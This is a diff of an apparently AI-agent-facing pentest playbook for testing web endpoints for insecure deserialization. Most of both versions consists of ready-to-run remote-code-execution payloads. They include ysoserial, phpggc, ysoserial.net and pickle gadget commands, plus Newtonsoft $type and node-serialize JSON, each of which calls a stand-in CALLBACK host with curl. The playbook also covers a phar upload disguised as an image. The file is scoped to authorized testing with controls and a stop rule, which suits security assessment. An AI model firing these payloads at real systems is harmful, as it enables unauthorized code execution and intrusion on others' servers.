@@ -13,98 +13,181 @@ Approved `host+endpoint+injection point` only. Every command via `cyber_process`
 
 ## Steps
 
-### 1. Technology identification
+### 1. Fingerprint the stack
 
-Before generating any payload, identify the stack:
+```
+cyber_process argv=["curl","-sS","-D","-","<url>/"]
+```
+
+Record cookies, server headers, path extensions. Match against:
+
 | Signal | Stack |
 |---|---|
-| `JSESSIONID` cookie, `.jsp`/`.do` paths | Java |
-| `PHPSESSID`, `.php` paths | PHP |
-| `ASP.NET_SessionId`, `.aspx` paths | .NET |
-| `connect.sid`, Express headers | Node.js |
-| `csrftoken` + Django headers | Python |
-| `_session_id` + Rails headers | Ruby |
+| `JSESSIONID`, `.jsp`/`.do` | Java |
+| `PHPSESSID`, `.php` | PHP |
+| `ASP.NET_SessionId`, `.aspx`, `__VIEWSTATE` | .NET |
+| `connect.sid`, `X-Powered-By: Express` | Node.js |
+| `csrftoken` + `X-Frame-Options` Django-style | Python |
+| `_session_id` + `X-Request-Id` Rails-style | Ruby |
 
-Check for serialized data in:
-- Cookies (Base64-encoded objects)
-- Hidden form fields
-- POST body (binary or Base64)
-- Custom headers
-- ViewState (.NET)
+### 2. Locate the injection point
 
-### 2. Format identification
+Look for serialized data in cookies, hidden fields, POST bodies, custom headers:
 
-| Format | Signature |
+```
+cyber_process argv=["curl","-sS","-D","-","-H","Cookie: <session>","<url>/api/endpoint"]
+```
+
+Decode the suspect value and check format signatures:
+
+| Format | Signature (first bytes) |
 |---|---|
 | Java ObjectInputStream | `aced 0005` (hex) or `rO0AB` (Base64) |
 | PHP serialize | `O:4:"User":2:{s:4:"name"` |
 | .NET BinaryFormatter | `AAEAAAD/////` (Base64) |
-| .NET JSON (Newtonsoft) | `{"$type":"System.` |
-| Python pickle | `\x80\x03` or `\x80\x04` or `\x80\x05` |
+| .NET Newtonsoft JSON | `{"$type":"System.` |
+| Python pickle | `\x80\x03` / `\x80\x04` / `\x80\x05` |
 | Ruby Marshal | `\x04\x08` |
-| Node.js | `{"rce":"_$$ND_FUNC$$_function(){...}"}` |
-| YAML | `!!python/object/apply:os.system` |
+| Node.js node-serialize | `{"rce":"_$$ND_FUNC$$_` |
+| YAML | `!!python/object/apply:` |
 
-### 3. Gadget chain selection
+### 3. Positive control — legitimate object
 
-**Java (ysoserial):**
-```bash
-java -jar ysoserial.jar CommonsCollections1 "curl https://CALLBACK/java-rce" | base64
+Send a well-formed, benign serialized object to confirm the endpoint processes it:
+
 ```
-Common chains: CommonsCollections1-7, CommonsBeanutils1, Spring1-2, Hibernate1, JRMPClient.
-Check the target's classpath (error messages, stack traces) to select the right chain.
-
-**PHP (phpggc):**
-```bash
-phpggc Laravel/RCE1 system "curl https://CALLBACK/php-rce" | base64
-```
-Common chains: Laravel/RCE1-9, Symfony/RCE1-4, Monolog/RCE1-7, Guzzle/RCE1.
-Trigger via `unserialize()`, `phar://` stream wrapper, or `__wakeup`/`__destruct`.
-
-**.NET:**
-- BinaryFormatter: `ysoserial.net -f BinaryFormatter -g TypeConfuseDelegate -c "curl CALLBACK"`
-- Newtonsoft JSON: `{"$type":"System.Windows.Data.ObjectDataProvider, ...","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, ...","StartInfo":{"FileName":"curl","Arguments":"CALLBACK"}}}`
-- ViewState: requires machine key or `__VIEWSTATEGENERATOR`
-
-**Python:**
-```python
-import pickle, os
-class RCE:
-    def __reduce__(self):
-        return (os.system, ("curl https://CALLBACK/python-rce",))
-pickle.dumps(RCE())
+cyber_process argv=["curl","-sS","-D","-","-X","POST","-H","Content-Type: application/x-java-serialized-object","-H","Cookie: <session>","--data-binary","@legitimate-object.bin","<url>/api/endpoint"]
 ```
 
-**Node.js:**
-```json
-{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl https://CALLBACK/node-rce')}()"}
+Record status, body, behavior. This is the functional baseline — the endpoint must accept and process the object normally.
+
+### 4. Gadget generation and delivery — Java
+
+Generate payload:
+
+```
+cyber_process argv=["java","-jar","ysoserial.jar","CommonsCollections1","curl https://CALLBACK/java-CC1-UNIQUE"]
 ```
 
-### 4. Delivery and confirmation
+Encode and deliver to the injection point:
 
-1. Inject the serialized payload in the identified injection point
-2. Wait for OOB callback at CALLBACK URL
-3. If callback received → RCE confirmed
-4. If no callback → try different gadget chains (the target may not have the required libraries)
+```
+cyber_process argv=["curl","-sS","-D","-","-X","POST","-H","Content-Type: application/x-java-serialized-object","-H","Cookie: <session>","--data-binary","@payload-cc1.bin","<url>/api/endpoint"]
+```
 
-### 5. Blind deserialization (no immediate response)
+If no callback → try other chains. Check error messages for classpath hints:
 
-If the endpoint processes the payload asynchronously:
-- Use DNS callback: `nslookup UNIQUE-ID.CALLBACK-DOMAIN`
-- Use time-based: gadget that calls `Thread.sleep(5000)` (Java) or `sleep(5)` (PHP)
-- 3 consistent time samples required for time-based confirmation
+```
+cyber_process argv=["curl","-sS","-D","-","-X","POST","-H","Content-Type: application/x-java-serialized-object","--data-binary","@payload-cb1.bin","<url>/api/endpoint"]
+```
 
-### 6. Negative controls
+Chains to try in order: CommonsCollections1-7, CommonsBeanutils1, Spring1-2, Hibernate1, JRMPClient.
 
-- Control 1: legitimate serialized object → processed normally (positive control)
-- Control 2: malformed serialized data → error, no execution
-- Control 3: gadget chain for a library NOT on the classpath → error, no callback
-- Control 4: well-formed object with no gadget → no callback
+### 5. Gadget generation and delivery — PHP
 
-## Proof contract
+```
+cyber_process argv=["phpggc","Laravel/RCE1","system","curl https://CALLBACK/php-laravel-UNIQUE","-b"]
+```
 
-A finding needs: (1) identified serialization format and stack, (2) working gadget chain with OOB callback, (3) reproduction with fresh correlation ID, (4) four negative controls. A deserialization error is a lead — OOB execution is a finding.
+Deliver via POST body or phar:// trigger:
+
+```
+cyber_process argv=["curl","-sS","-D","-","-X","POST","-H","Content-Type: application/x-php-serialized","-d","<base64-payload>","<url>/api/endpoint"]
+```
+
+For phar:// trigger (requires file upload vector): upload a `.phar` disguised as an image, then trigger via a file operation that accepts `phar://`:
+
+```
+cyber_process argv=["curl","-sS","-D","-","-X","POST","-F","file=@payload.phar;filename=avatar.jpg","<url>/api/upload"]
+cyber_process argv=["curl","-sS","-D","-","<url>/api/file?path=phar://uploads/avatar.jpg/test"]
+```
+
+### 6. Gadget generation and delivery — .NET / Python / Node.js
+
+**.NET BinaryFormatter:**
+
+```
+cyber_process argv=["ysoserial.exe","-f","BinaryFormatter","-g","TypeConfuseDelegate","-c","curl https://CALLBACK/dotnet-UNIQUE"]
+```
+
+```
+cyber_process argv=["curl","-sS","-D","-","-X","POST","-H","Content-Type: application/octet-stream","--data-binary","@dotnet-payload.bin","<url>/api/endpoint"]
+```
+
+**.NET Newtonsoft JSON (TypeNameHandling):**
+
+```
+cyber_process argv=["curl","-sS","-D","-","-X","POST","-H","Content-Type: application/json","-d","{\"$type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework\",\"MethodName\":\"Start\",\"ObjectInstance\":{\"$type\":\"System.Diagnostics.Process, System\",\"StartInfo\":{\"FileName\":\"curl\",\"Arguments\":\"https://CALLBACK/dotnet-json-UNIQUE\"}}}","<url>/api/endpoint"]
+```
+
+**Python pickle:**
+
+```
+cyber_process argv=["python3","-c","import pickle,base64,os;exec('class R:\\n def __reduce__(self):\\n  return(os.system,(\"curl https://CALLBACK/py-UNIQUE\",))');print(base64.b64encode(pickle.dumps(R())).decode())"]
+```
+
+```
+cyber_process argv=["curl","-sS","-D","-","-X","POST","-H","Content-Type: application/octet-stream","--data-binary","@pickle-payload.bin","<url>/api/endpoint"]
+```
+
+**Node.js node-serialize:**
+
+```
+cyber_process argv=["curl","-sS","-D","-","-X","POST","-H","Content-Type: application/json","-d","{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('curl https://CALLBACK/node-UNIQUE')}()\"}","<url>/api/endpoint"]
+```
+
+### 7. Blind deserialization — time and DNS
+
+If no OOB callback infrastructure, use timing:
+
+```
+cyber_process argv=["curl","-sS","-o","/dev/null","-w","time:%{time_total}","-X","POST","--data-binary","@sleep-gadget.bin","<url>/api/endpoint"]
+```
+
+Three samples: if `time_total` > 5s consistently when using `Thread.sleep(5000)` gadget vs < 1s for benign object → time-based confirmation.
+
+For DNS-only callback:
+
+```
+cyber_process argv=["java","-jar","ysoserial.jar","URLDNS","https://UNIQUE-ID.CALLBACK-DOMAIN"]
+```
+
+URLDNS requires no classpath dependency — if DNS callback received, deserialization is confirmed (but not RCE).
+
+### 8. Negative controls
+
+| Control | Payload | Expected |
+|---|---|---|
+| Legitimate object | well-formed, no gadget | processed normally |
+| Malformed data | truncated or corrupted bytes | error, no execution |
+| Wrong classpath chain | CommonsCollections on target without commons-collections | error, no callback |
+| Well-formed object, no gadget trigger | valid User object without exploit chain | no callback |
+
+### Stop
+
+Destructive payloads (`rm`, file write to system dirs), more than one gadget per attempt, chaining beyond OOB confirmation.
+
+### Evidence ids
+
+Keep stack-fingerprint, injection-point-location, positive-control, each gadget delivery (with chain name + UNIQUE callback id), timing samples (3), URLDNS probe, and all 4 controls as separate observations.
+
+## Verification scenarios
+
+| Scenario | Observation | Expected classification |
+|---|---|---|
+| CommonsCollections1 → HTTP callback received | CALLBACK log shows java-CC1-UNIQUE | Java deserialization RCE candidate |
+| CommonsCollections1 → no callback, error mentions missing class | stack trace with ClassNotFoundException | wrong chain, try next |
+| URLDNS → DNS callback received | DNS log for UNIQUE-ID | deserialization confirmed (not RCE) |
+| phpggc Laravel/RCE1 → HTTP callback | CALLBACK log | PHP deserialization RCE candidate |
+| phar:// trigger → HTTP callback after file upload + path traversal | CALLBACK log | phar deserialization candidate |
+| Newtonsoft JSON $type → HTTP callback | CALLBACK log | .NET TypeNameHandling RCE candidate |
+| pickle → HTTP callback | CALLBACK log | Python pickle RCE candidate |
+| node-serialize → HTTP callback | CALLBACK log | Node.js deserialization RCE candidate |
+| Sleep gadget → 5s delay, 3 samples | consistent time_total > 5s | time-based blind deserialization |
+| Benign object → no callback | normal processing | negative control confirmed |
+
+A deserialization error is a lead. The finding is the OOB callback or consistent timing anomaly.
 
 ## Done
 
-Each finding cites the format, the gadget chain, the library version, the OOB proof, and all negative controls.
+`cyber_finding` cites the format, the gadget chain name, the library/classpath, the OOB proof (callback ID or timing), and all 4 controls. URLDNS alone proves deserialization but not RCE — classify accordingly. Untested stacks stay `not-tested`.
